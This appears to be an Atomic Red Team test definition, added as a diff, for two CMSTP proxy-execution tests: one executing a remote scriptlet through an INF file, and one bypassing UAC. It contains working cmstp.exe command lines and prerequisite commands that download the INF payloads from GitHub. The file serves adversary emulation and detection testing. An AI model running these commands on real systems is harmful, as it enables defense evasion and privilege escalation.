@@ -1,0 +1,64 @@
+{
+  "attack_technique": "T1218.003",
+  "display_name": "Signed Binary Proxy Execution: CMSTP",
+  "atomic_tests": [
+    {
+      "name": "CMSTP Executing Remote Scriptlet",
+      "description": "Adversaries may supply CMSTP.exe with INF files infected with malicious commands",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "command_prompt",
+        "elevation_required": false,
+        "procedure": "cmstp.exe /s \"#{inf_file_path}\""
+      },
+      "input_arguments": [
+        {
+          "arg_name": "inf_file_path",
+          "description": "Path to the INF file",
+          "type": "path",
+          "default": "PathToAtomicsFolder\\T1218.003\\src\\T1218.003.inf"
+        }
+      ],
+      "dependencies": [
+        {
+          "description": "INF file must exist on disk at specified location (#{inf_file_path})",
+          "prereq_command": "if (Test-Path \"#{inf_file_path}\") {exit 0} else {exit 1}",
+          "get_prereq_command": "New-Item -Type Directory (split-path \"#{inf_file_path}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.003/src/T1218.003.inf\" -OutFile \"#{inf_file_path}\""
+        }
+      ],
+      "dependency_executor_name": "powershell",
+      "auto_generated_guid": "34e63321-9683-496b-bbc1-7566bc55e624"
+    },
+    {
+      "name": "CMSTP Executing UAC Bypass",
+      "description": "Adversaries may invoke cmd.exe (or other malicious commands) by embedding them in the RunPreSetupCommandsSection of an INF file",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "command_prompt",
+        "elevation_required": false,
+        "procedure": "cmstp.exe /s \"#{inf_file_uac}\" /au"
+      },
+      "input_arguments": [
+        {
+          "arg_name": "inf_file_uac",
+          "description": "Path to the INF file",
+          "type": "path",
+          "default": "PathToAtomicsFolder\\T1218.003\\src\\T1218.003_uacbypass.inf"
+        }
+      ],
+      "dependencies": [
+        {
+          "description": "INF file must exist on disk at specified location (#{inf_file_uac})",
+          "prereq_command": "if (Test-Path \"#{inf_file_uac}\") {exit 0} else {exit 1}",
+          "get_prereq_command": "New-Item -Type Directory (split-path \"#{inf_file_uac}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.003/src/T1218.003_uacbypass.inf\" -OutFile \"#{inf_file_uac}\""
+        }
+      ],
+      "dependency_executor_name": "powershell",
+      "auto_generated_guid": "748cb4f6-2fb3-4e97-b7ad-b22635a09ab0"
+    }
+  ]
+}
